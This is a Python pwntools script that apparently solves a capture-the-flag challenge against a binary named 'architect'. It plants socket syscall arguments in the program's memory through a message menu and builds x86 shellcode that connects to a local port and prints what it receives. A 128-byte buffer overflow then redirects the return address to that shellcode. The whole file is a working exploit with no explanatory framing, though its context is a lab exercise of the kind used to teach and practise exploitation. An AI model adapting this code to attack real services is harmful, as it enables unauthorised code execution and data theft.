from pwn import *

import time

pty = process.PTY
proc = remote("172.17.0.2", 1337) # Use whatever IP the docker container is using.
#proc = process(["./architect"], stdin=pty, stdout=pty, stderr=pty) # Or run locally

# Get these from a reference implementation of the syscalls in C
SYS_SOCKET_args = b"\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

sockaddr_in = b"\x02\x00\x00\x50\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"

# we assume fd is 3 when running remotely.
# when running in docker, due to socat, this will most likely be 5 instead.
# you can see this when running strace on the socat command (make sure you pass the -f flag)
# replace ff with the lower bytes of the struct addr
SYS_CONNECT_args = b"\x05\x00\x00\x00\xff\xff\xff\xff\x10\x00\x00\x00\x00\x00\x00\x00"

# allocate a 128 byte buffer and replace ff with the address of the buffer
SYS_RECV_args = b"\x05\x00\x00\x00\xff\xff\xff\xff\x80\x00\x00\x00\x00\x00\x00\x00"


def make_shellcode(socket_arg_ptr, connect_arg_ptr, recv_arg_ptr, ret_location, buffer_ptr):
    assembly = f"""
    mov eax, 102
    mov ebx, 1
    mov ecx, {socket_arg_ptr}
    int 0x80
    
    mov eax, 102
    mov ebx, 3 
    mov ecx, {connect_arg_ptr}
    int 0x80
    
    mov eax, 102
    mov ebx, 10
    mov ecx, {recv_arg_ptr}
    int 0x80
    
    mov rax, 1
    mov rdi, 1
    mov rsi, {buffer_ptr}
    mov rdx, 128
    syscall
    """
    shellcode = asm(assembly, arch='x86_64', os='linux')
    # replace return address with the address of the shellcode
    # the buffer is 128 bytes long
    shellcode += b"\x90" * (128 - len(shellcode) + 7)
    addr = pack(ret_location, 64)
    shellcode += addr
    return shellcode


def insert_bytes(data, len=None):
    proc.recvuntil(b"Choice: ")
    proc.send(b"1\n")
    proc.recvuntil(b"Message length: ")
    if len is None:
        proc.send(b"16\n")
    else:
        proc.send(f"{len}\n".encode())
    proc.recvuntil(b"Enter your message: ")
    proc.send(data + b"\n")
    proc.recvuntil(b"Unique identifier: ")
    addr = proc.recvline().strip()
    return int(addr.decode('utf-8'), 16)


proc.recvuntil(b"Current location: ")
stack_begin = int(proc.recvline().strip().decode('utf-8'), 16)

socket_arg_ptr = insert_bytes(SYS_SOCKET_args)

sockaddr_in_ptr = insert_bytes(sockaddr_in)
SYS_CONNECT_args = SYS_CONNECT_args.replace(b"\xff\xff\xff\xff", pack(sockaddr_in_ptr, 32))
connect_arg_ptr = insert_bytes(SYS_CONNECT_args)

buffer_ptr = insert_bytes(b"\x00" * 128, 128)
SYS_RECV_args = SYS_RECV_args.replace(b"\xff\xff\xff\xff", pack(buffer_ptr, 32))
recv_arg_ptr = insert_bytes(SYS_RECV_args)

# we can get the shellcode offset by debugging the source code and checking the addresses. They do not change.
shellcode = make_shellcode(socket_arg_ptr, connect_arg_ptr, recv_arg_ptr, stack_begin - 219, buffer_ptr)
shellcode_ptr = insert_bytes(shellcode, len=len(shellcode))
proc.recvuntil(b"Choice: ")
proc.send(b"2\n")
proc.recvuntil(b"Enter the unique identifier of the message you want to read: ")
proc.send(hex(shellcode_ptr).encode() + b"\n")

print(proc.recvall().replace(b"\x00", b"").decode(errors="ignore"))
